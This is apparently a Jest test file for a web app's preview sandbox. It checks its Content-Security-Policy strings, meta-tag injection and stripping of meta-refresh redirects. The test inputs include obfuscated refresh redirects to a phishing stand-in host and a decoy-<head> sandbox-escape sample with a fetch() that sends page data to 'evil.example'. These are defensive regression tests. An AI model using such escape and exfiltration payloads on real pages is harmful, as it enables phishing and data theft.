import {
  CHART_PREVIEW_CSP,
  HTML_EXPORT_CSP,
  PDF_PREVIEW_CSP,
  PREVIEW_CSP,
  PREVIEW_CSP_INLINE,
  PREVIEW_CSP_LIVE,
  PREVIEW_VIEWPORT,
  injectPreviewCsp,
  prepareHtmlRunDocument,
} from "@/lib/previewSandbox";

describe("PREVIEW_VIEWPORT", () => {
  it("does not lock pinch zoom or system text scaling", () => {
    expect(PREVIEW_VIEWPORT).toContain("width=device-width");
    expect(PREVIEW_VIEWPORT).not.toContain("maximum-scale");
  });
});

describe("PREVIEW_CSP", () => {
  it("blocks network egress and forms, allows inline scripts only", () => {
    expect(PREVIEW_CSP).toContain("default-src 'none'");
    expect(PREVIEW_CSP).toContain("script-src 'unsafe-inline'");
    expect(PREVIEW_CSP).toContain("style-src 'unsafe-inline'");
    expect(PREVIEW_CSP).toContain("connect-src 'none'");
    expect(PREVIEW_CSP).toContain("form-action 'none'");
    expect(PREVIEW_CSP).toContain("base-uri 'none'");
    expect(PREVIEW_CSP).toContain("sandbox allow-scripts");
  });

  it("PREVIEW_CSP_INLINE keeps egress locks without meta sandbox", () => {
    expect(PREVIEW_CSP_INLINE).toContain("connect-src 'none'");
    expect(PREVIEW_CSP_INLINE).not.toContain("sandbox");
    expect(PREVIEW_CSP.startsWith(PREVIEW_CSP_INLINE)).toBe(true);
  });

  it("PREVIEW_CSP_LIVE allowlists known CDNs instead of open https", () => {
    expect(PREVIEW_CSP_LIVE).toContain("https://cdn.jsdelivr.net");
    expect(PREVIEW_CSP_LIVE).toContain("https://unpkg.com");
    expect(PREVIEW_CSP_LIVE).toContain("https://cdnjs.cloudflare.com");
    expect(PREVIEW_CSP_LIVE).toContain("https://fonts.googleapis.com");
    expect(PREVIEW_CSP_LIVE).toContain("https://fonts.gstatic.com");
    expect(PREVIEW_CSP_LIVE).toContain("form-action 'none'");
    expect(PREVIEW_CSP_LIVE).toContain("frame-src 'none'");
    expect(PREVIEW_CSP_LIVE).not.toContain("sandbox");
    expect(PREVIEW_CSP_LIVE).not.toContain("https: http:");
    const tokens = PREVIEW_CSP_LIVE.split(/[;\s]+/);
    expect(tokens).not.toContain("https:");
    expect(tokens).not.toContain("http:");
  });
});

describe("prepareHtmlRunDocument", () => {
  it("injects live CSP and stay-on-page script", () => {
    const out = prepareHtmlRunDocument(
      "<!DOCTYPE html><html><head></head><body><h1>Hi</h1></body></html>",
    );
    expect(out).toContain("Content-Security-Policy");
    expect(out).toContain("https://cdn.jsdelivr.net");
    expect(out).not.toContain("connect-src https: http:");
    expect(out).toContain("addEventListener(\"click\"");
    expect(out).toContain("<h1>Hi</h1>");
  });

  it("overrides window.open, location.assign/replace, and location.href", () => {
    const out = prepareHtmlRunDocument(
      "<!DOCTYPE html><html><head></head><body></body></html>",
    );
    expect(out).toContain("window.open = function");
    expect(out).toContain("loc.assign = function");
    expect(out).toContain("loc.replace = function");
    expect(out).toContain("Object.defineProperty(loc, \"href\"");
  });

  it("strips meta-refresh before injecting CSP and stay script", () => {
    const out = prepareHtmlRunDocument(
      '<html><head><meta http-equiv="refresh" content="0;url=https://evil.example/phish"></head><body>ok</body></html>',
    );
    expect(out.toLowerCase()).not.toContain("refresh");
    expect(out).not.toContain("evil.example");
    expect(out).toContain("Content-Security-Policy");
  });

  it("strips meta-refresh in the shapes the tokenizer still reads as one", () => {
    for (const refresh of [
      '<meta/http-equiv="refresh" content="0;url=https://evil.example/phish">',
      '<meta http-equiv="re&#102;resh" content="0;url=https://evil.example/phish">',
      '<meta content="a>b" http-equiv=REFRESH content="0;url=https://evil.example/phish">',
    ]) {
      const out = prepareHtmlRunDocument(`<html><head>${refresh}</head><body>ok</body></html>`);
      expect(out).not.toContain("evil.example");
      expect(out).toContain("<body>ok</body>");
    }
  });

  it("injects the stay script immediately after the CSP meta, before user head scripts", () => {
    const out = prepareHtmlRunDocument(
      "<html><head><script>window.user=1</script></head><body></body></html>",
    );
    const cspAt = out.indexOf("Content-Security-Policy");
    const stayAt = out.indexOf("window.open = function");
    const userAt = out.indexOf("window.user=1");
    expect(cspAt).toBeGreaterThan(-1);
    expect(stayAt).toBeGreaterThan(cspAt);
    expect(userAt).toBeGreaterThan(stayAt);
  });
});

describe("PREVIEW_CSP egress details", () => {
  it("blocks https on script/style (external script-src exfiltration)", () => {
    // connect-src 'none' alone is not enough: <script src="https://evil/?…">
    // still fires a GET. Inline-only preview — no CDN hosts.
    const scriptSrc = PREVIEW_CSP.match(/script-src\s+([^;]+)/)?.[1].trim();
    const styleSrc = PREVIEW_CSP.match(/style-src\s+([^;]+)/)?.[1].trim();
    expect(scriptSrc).toBe("'unsafe-inline'");
    expect(styleSrc).toBe("'unsafe-inline'");
    for (const value of [scriptSrc, styleSrc]) {
      expect(value).not.toContain("https:");
      expect(value).not.toContain("*");
    }
  });

  it("blocks https on img/font/media (passive GET exfiltration)", () => {
    // connect-src 'none' alone is not enough: <img src="https://attacker/…">
    // still fires a GET when the DOM parses. Mermaid inherits this CSP.
    const imgSrc = PREVIEW_CSP.match(/img-src\s+([^;]+)/)?.[1].trim();
    const fontSrc = PREVIEW_CSP.match(/font-src\s+([^;]+)/)?.[1].trim();
    const mediaSrc = PREVIEW_CSP.match(/media-src\s+([^;]+)/)?.[1].trim();
    expect(imgSrc).toBe("data: blob:");
    expect(fontSrc).toBe("data:");
    expect(mediaSrc).toBe("data: blob:");
    for (const value of [imgSrc, fontSrc, mediaSrc]) {
      expect(value).not.toContain("https:");
      expect(value).not.toContain("*");
    }
  });
});

describe("PDF_PREVIEW_CSP", () => {
  it("allows a blob worker (pdf.js worker is vendored inline) and blocks all network egress", () => {
    // pdf.js + its worker are vendored and inlined; the worker is built from a
    // Blob URL at runtime, so the CSP must allow `worker-src blob:` while
    // keeping `connect-src 'none'` (no network fetch is needed — the PDF bytes
    // are inlined as base64).
    expect(PDF_PREVIEW_CSP).toContain("worker-src blob:");
    expect(PDF_PREVIEW_CSP).toContain("connect-src 'none'");
  });

  it("keeps the rest of the policy as locked-down as PREVIEW_CSP", () => {
    expect(PDF_PREVIEW_CSP).toContain("default-src 'none'");
    expect(PDF_PREVIEW_CSP).toContain("script-src 'unsafe-inline'");
    expect(PDF_PREVIEW_CSP).not.toContain("script-src 'unsafe-inline' https:");
    expect(PDF_PREVIEW_CSP).toContain("form-action 'none'");
    expect(PDF_PREVIEW_CSP).toContain("base-uri 'none'");
    expect(PDF_PREVIEW_CSP).toContain("sandbox allow-scripts");
  });

  it("does NOT allow connect-src to any origin (no exfiltration, no CDN)", () => {
    // The connect-src must be 'none' — not 'https:' (any HTTPS origin), not a
    // CDN host, not '*'. pdf.js no longer fetches anything at runtime.
    const connectSrcMatch = PDF_PREVIEW_CSP.match(/connect-src\s+([^;]+)/);
    expect(connectSrcMatch).not.toBeNull();
    const connectSrcValue = connectSrcMatch![1].trim();
    expect(connectSrcValue).toBe("'none'");
    expect(connectSrcValue).not.toBe("https:");
    expect(connectSrcValue).not.toBe("*");
    expect(connectSrcValue).not.toContain("cdnjs.cloudflare.com");
  });

  it("allows worker-src only for blob: (not arbitrary origins)", () => {
    const workerSrcMatch = PDF_PREVIEW_CSP.match(/worker-src\s+([^;]+)/);
    expect(workerSrcMatch).not.toBeNull();
    const workerSrcValue = workerSrcMatch![1].trim();
    expect(workerSrcValue).toBe("blob:");
  });
});

describe("CHART_PREVIEW_CSP", () => {
  it("allows unsafe-eval so Vega can compile expressions, without network egress", () => {
    expect(CHART_PREVIEW_CSP).toContain("script-src 'unsafe-inline' 'unsafe-eval'");
    expect(CHART_PREVIEW_CSP).toContain("connect-src 'none'");
    expect(CHART_PREVIEW_CSP).toContain("default-src 'none'");
    expect(CHART_PREVIEW_CSP).toContain("form-action 'none'");
    expect(CHART_PREVIEW_CSP).toContain("base-uri 'none'");
  });

  it("does not open script-src to https (eval is chart-only, not CDN)", () => {
    const scriptSrc = CHART_PREVIEW_CSP.match(/script-src\s+([^;]+)/)?.[1].trim();
    expect(scriptSrc).toBe("'unsafe-inline' 'unsafe-eval'");
    expect(scriptSrc).not.toContain("https:");
  });

  it("does not leak eval onto the user-HTML preview CSP", () => {
    expect(PREVIEW_CSP).not.toContain("unsafe-eval");
    expect(PREVIEW_CSP).toContain("script-src 'unsafe-inline'");
  });
});

describe("injectPreviewCsp", () => {
  const meta = (csp: string = PREVIEW_CSP) =>
    `<meta http-equiv="Content-Security-Policy" content="${csp}">`;

  it("puts the CSP meta first, after the DOCTYPE, so it is the head's first child", () => {
    const html = "<!DOCTYPE html><html><head><title>x</title></head><body></body></html>";
    expect(injectPreviewCsp(html)).toBe(
      `<!DOCTYPE html>${meta()}<html><head><title>x</title></head><body></body></html>`,
    );
  });

  it("does the same with no <head> tag, a lower-case DOCTYPE or whitespace before it", () => {
    expect(injectPreviewCsp("<!DOCTYPE html><html><body><p>hi</p></body></html>")).toBe(
      `<!DOCTYPE html>${meta()}<html><body><p>hi</p></body></html>`,
    );
    expect(injectPreviewCsp("\n  <!doctype html>\n<html></html>")).toBe(
      `\n  <!doctype html>${meta()}\n<html></html>`,
    );
  });

  it("puts the CSP meta first in a document with no DOCTYPE", () => {
    expect(injectPreviewCsp("<html><head></head><body></body></html>")).toBe(
      `${meta()}<html><head></head><body></body></html>`,
    );
    // Not HTML whitespace before the DOCTYPE: the browser reads it as text, so it is not skipped.
    expect(injectPreviewCsp("\u00A0<!DOCTYPE html><html></html>").startsWith(meta())).toBe(true);
  });

  it("wraps bare HTML into a document with the CSP", () => {
    const out = injectPreviewCsp("<p>hello</p>");
    expect(out).toBe(`<!DOCTYPE html><html><head>${meta()}</head><body><p>hello</p></body></html>`);
  });

  it("only injects a single CSP meta (idempotent-ish for one pass)", () => {
    const html = "<html><head></head><body></body></html>";
    const out = injectPreviewCsp(html);
    const count = (out.match(/Content-Security-Policy/g) || []).length;
    expect(count).toBe(1);
  });

  // BUG FIX (A3): a <head> tag that comes after body content is ignored by the
  // parser, which already closed an implied head; the meta used to be spliced
  // after that tag, so it sat in <body>, where a browser ignores a CSP meta
  // (HTML §4.2.5.3). The document ran with no policy at all.
  it.each([
    ["text", "<!DOCTYPE html><html>x<head><title>t</title></head><body></body></html>"],
    ["a paragraph", "<!DOCTYPE html><html><p>x</p><head></head><body></body></html>"],
    ["an image", "<!DOCTYPE html><html><img src=x><head></head><body></body></html>"],
    ["a textarea", "<!DOCTYPE html><html><textarea>t</textarea><head></head><body></body></html>"],
    ["a body tag", "<!DOCTYPE html><html><body></body><head></head></html>"],
  ])("keeps the CSP in the head when %s comes before the <head> tag", (_what, html) => {
    const out = injectPreviewCsp(html);
    expect(out).toBe(`<!DOCTYPE html>${meta()}${html.slice("<!DOCTYPE html>".length)}`);
  });

  it("puts the CSP before scripts that appear before <head>, so they run under it", () => {
    const html =
      "<html><script>window.pwned=1</script><head><title>x</title></head><body></body></html>";
    const out = injectPreviewCsp(html);
    expect(out.startsWith(meta())).toBe(true);
    expect(out.indexOf(meta())).toBeLessThan(out.indexOf("window.pwned"));
  });

  // BUG FIX (was a confirmed sandbox escape): a decoy "<head" inside a
  // <script> comment (or <style>/HTML comment/<textarea>/<title>/an attribute)
  // that appears before the real <head> used to fool the plain-text search into
  // splicing the CSP meta into that inert block instead — leaving the real
  // document with no CSP at all, and the attacker's script running with
  // full network egress despite connect-src 'none'. Nothing is searched for
  // now: the CSP is the first element, ahead of every decoy and script.
  it.each([
    [
      "a <script> comment",
      '<!DOCTYPE html><html><script>\n// <head>\nfetch("https://evil.example/steal?x=" + document.title);\n</script>\n<head><title>Legit</title></head><body>Hello</body></html>',
    ],
    [
      "a <style> block",
      "<!DOCTYPE html><html><style>/* <head> */ body { color: red; }</style><head><title>Real</title></head><body></body></html>",
    ],
    [
      "an HTML comment",
      "<!DOCTYPE html><html><!-- <head> --><head><title>Real</title></head><body></body></html>",
    ],
    [
      "a <textarea>",
      "<!DOCTYPE html><html><textarea>sample: <head> tag</textarea><head><title>Real</title></head><body></body></html>",
    ],
    [
      "an attribute",
      '<!DOCTYPE html><html title="<head>"><head><title>Real</title></head><body></body></html>',
    ],
  ])("is not fooled by a decoy <head> inside %s", (_where, html) => {
    expect(injectPreviewCsp(html)).toBe(
      `<!DOCTYPE html>${meta()}${html.slice("<!DOCTYPE html>".length)}`,
    );
  });
});

describe("HTML_EXPORT_CSP", () => {
  const directives = HTML_EXPORT_CSP.split(";").map((d) => d.trim());

  it("is exactly the export policy: no script, inline styles, data/https images, no base or forms", () => {
    expect(directives).toEqual([
      "default-src 'none'",
      "style-src 'unsafe-inline'",
      "img-src data: https:",
      "base-uri 'none'",
      "form-action 'none'",
    ]);
  });

  it("never allows script, eval, connections or frames", () => {
    expect(HTML_EXPORT_CSP).not.toMatch(/script-src|unsafe-eval|connect-src|frame-src|child-src/);
    expect(HTML_EXPORT_CSP).not.toContain("http:");
  });
});
